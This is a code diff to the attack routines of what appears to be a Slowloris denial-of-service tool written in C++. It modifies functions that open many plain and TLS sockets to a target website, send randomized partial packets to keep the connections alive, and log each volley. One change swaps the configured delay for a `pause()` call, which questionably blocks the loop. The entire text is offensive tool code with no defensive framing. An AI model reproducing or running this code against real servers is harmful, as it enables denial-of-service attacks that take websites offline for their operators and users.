@@ -1,6 +1,5 @@
 #include <netdb.h>
 #include <cstring>
-#include <unistd.h>
 #include <openssl/ssl.h>
 
 #include "../Headers/Slowloris.hpp"
@@ -20,8 +19,8 @@ void Slowloris::attack(const int *id) {
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 keep_alive[x] = false;
             }
-            const char *packet = Randomizer::randomPacket(conf, keep_alive[x]);
-            if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) == -1){
+            const std::string &packet = Randomizer::randomPacket(conf, keep_alive[x]);
+            if((r = write_socket(sockets[x], packet.c_str(), static_cast<int>(packet.length()))) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 keep_alive[x] = false;
@@ -39,7 +38,7 @@ void Slowloris::attack(const int *id) {
         }
         message = std::to_string(*id) + ": Voly Sent";
         logger->Log(&message, Logger::Info);
-        usleep(static_cast<__useconds_t>(conf->delay));
+        pause();
     }
 }
 
@@ -64,8 +63,8 @@ void Slowloris::attack_ssl(const int *id) {
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                 keep_alive[x] = false;
             }
-            const char *packet = Randomizer::randomPacket(conf, keep_alive[x]);
-            if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) == -1){
+            const std::string &packet = Randomizer::randomPacket(conf, keep_alive[x]);
+            if((r = write_socket(SSLs[x], packet.c_str(), static_cast<int>(packet.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
@@ -85,7 +84,7 @@ void Slowloris::attack_ssl(const int *id) {
         }
         message = std::to_string(*id) + ": Voly Sent";
         logger->Log(&message, Logger::Info);
-        usleep(static_cast<__useconds_t>(conf->delay));
+        pause();
     }
 }
 
